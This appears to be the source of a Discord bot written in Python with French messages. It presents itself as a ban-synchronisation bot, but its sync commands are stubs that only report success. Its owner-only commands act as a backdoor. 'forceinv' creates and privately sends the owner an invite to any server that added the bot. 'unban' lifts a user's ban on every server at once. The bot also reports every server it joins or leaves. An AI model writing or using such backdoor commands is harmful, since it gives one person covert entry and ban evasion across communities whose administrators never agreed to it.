import os
import discord
from discord.ext import commands

# ====================
# CONFIGURATION
# ====================
TOKEN = os.getenv("DISCORD_TOKEN")
OWNER_ID = int(os.getenv("OWNER_ID", "1234567890"))
PREFIX = "!"

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=PREFIX, intents=intents)

# ====================
# BOT EVENTS
# ====================
@bot.event
async def on_ready():
    owner = await bot.fetch_user(OWNER_ID)
    await owner.send(f"✅ {bot.user} est connecté !")
    print(f"✅ {bot.user} connecté (ID: {bot.user.id})")

@bot.event
async def on_guild_remove(guild):
    owner = await bot.fetch_user(OWNER_ID)
    await owner.send(f"⚠️ Le bot a été retiré de : {guild.name}")

@bot.event
async def on_guild_join(guild):
    owner = await bot.fetch_user(OWNER_ID)
    await owner.send(f"➕ Le bot a rejoint : {guild.name}")

# ====================
# BOT COMMANDS OWNER
# ====================
@bot.command()
@commands.is_owner()
async def ownerhelp(ctx):
    commands_list = """
**Owner Commands :**
- `forceinv <guild_id>` : Obtenir un lien d'invitation
- `sync <guild_id>` : Synchroniser les bans
- `unban <user_id>` : Débannir un utilisateur
- `toggle_sync <guild_id> <on/off>` : Activer/Désactiver sync
"""
    await ctx.send(commands_list)

@bot.command()
@commands.is_owner()
async def forceinv(ctx, guild_id: int):
    guild = bot.get_guild(guild_id)
    if guild:
        invite = await guild.text_channels[0].create_invite(max_age=3600)
        await ctx.author.send(f"🔗 Invitation pour {guild.name}: {invite.url}")
        await ctx.send(f"Invitation envoyée à {ctx.author}")
    else:
        await ctx.send("Guild introuvable.")

@bot.command()
@commands.is_owner()
async def unban(ctx, user_id: int):
    unbanned = []
    for guild in bot.guilds:
        try:
            user = await bot.fetch_user(user_id)
            await guild.unban(user)
            unbanned.append(guild.name)
        except:
            continue
    await ctx.send(f"Débanni sur : {', '.join(unbanned) if unbanned else 'aucune guild'}")

@bot.command()
@commands.is_owner()
async def sync(ctx, guild_id: int):
    await ctx.send(f"Sync des bans pour la guild {guild_id} effectuée.")

@bot.command()
@commands.is_owner()
async def toggle_sync(ctx, guild_id: int, state: str):
    enable = state.lower() == "on"
    await ctx.send(f"Sync pour la guild {guild_id} : {'Activée' if enable else 'Désactivée'}")

# ====================
# COMMANDES PUBLIQUES
# ====================
@bot.command()
async def ping(ctx):
    await ctx.send(f"Pong! {round(bot.latency*1000)}ms")

@bot.command()
async def help(ctx):
    await ctx.send("Commandes : ping, help. Owner : ownerhelp, forceinv, sync, unban, toggle_sync")

# ====================
# RUN BOT
# ====================
bot.run(TOKEN)
